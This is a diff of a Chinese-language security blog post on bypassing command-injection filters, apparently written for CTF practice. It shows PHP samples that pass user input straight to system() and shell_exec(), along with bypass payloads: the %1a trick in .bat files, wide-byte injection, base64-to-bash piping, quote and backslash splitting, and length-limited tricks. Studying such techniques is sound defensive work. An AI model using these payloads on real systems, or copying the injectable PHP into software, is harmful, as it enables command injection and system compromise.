@@ -1,12 +1,19 @@
+---
+title: 命令执行的一些绕过技巧
+date: 2017-08-15 19:05:33
+tags: [php,代码审计,代码执行]
+categories: Web Security
+copyright: true
+---
 # 绕过escapeshellcmd
-## 法一：执行bat
-```php 
+## 法一：win下执行bat
+```php
 <?php
-    $command = 'dir '.$_POST['dir'];
-    $escaped_command = escapeshellcmd($command);
-    var_dump($escaped_command);
-    file_put_contents('out.bat',$escaped_command);
-    system('out.bat');
+$command = 'dir '.$_POST['dir'];
+$escaped_command = escapeshellcmd($command);
+var_dump($escaped_command);
+file_put_contents('out.bat',$escaped_command);
+system('out.bat');
 ?>
 ```
 执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。
@@ -17,11 +24,11 @@ dir=../ %1a whoami
 ## 法二：宽字节注入
 php5.2.5及之前可以通过输入多字节来绕过。现在几乎见不到了。
 ```
-escapeshellcmd("echo ".chr(0xc0).";id"); 
+escapeshellcmd("echo ".chr(0xc0).";id");
 ```
 之后该语句会变成
 ```
-echo 繺;id 
+echo 繺;id
 ```
 从而实现 id 命令的注入。
 
@@ -77,8 +84,39 @@ payload2:
 ubuntu@VM-207-93-ubuntu:~$ echo "Y2F0IGZsYWc="|base64 -d|bash
 nice day
 ```
+## 法四： 单引号、双引号
+payload1:
+```
+ubuntu@VM-207-93-ubuntu:~$ c""at flag
+nice day
+```
+payload2:
+```
+ubuntu@VM-207-93-ubuntu:~$ c""at fl""ag
+nice day
+```
+payload3:
+```
+ubuntu@VM-207-93-ubuntu:~$ c""at fl''ag
+nice day
+```
+## 法五：反斜线 \
+payload:
+```
+ubuntu@VM-207-93-ubuntu:~$ c\at fl\ag
+nice day
+```
+
+# 无回显
 
 # 长度限制
+```php
+<?php
+if(strlen($_GET[test])<8){
+echo shell_exec($_GET[test]);
+}
+?>
+```
 ## 文件构造
 payload1:
 ```
@@ -93,26 +131,16 @@ payload3:
 >wget
 ```
 将会创建一个名字为wget的空文件。payload1会报错，payload2不会报错。.
-类似的，可以执行一系列操作，比如：
-```
 
-```
 
-```php 
-<?php
-if(strlen($_GET[test])<8){
-     echo shell_exec($_GET[test]);
-}
-?>
-```
-# 无回显
+
 
 
 # LINUX下一些已有字符
 + ${PS2} 对应字符 '>'
 + ${PS4} 对应字符 '+'
 + ${IFS} 对应 内部字段分隔符
-+ ${9}   对应 空字符串
++ ${9} 对应 空字符串
 
 # 工具
 + [shelling
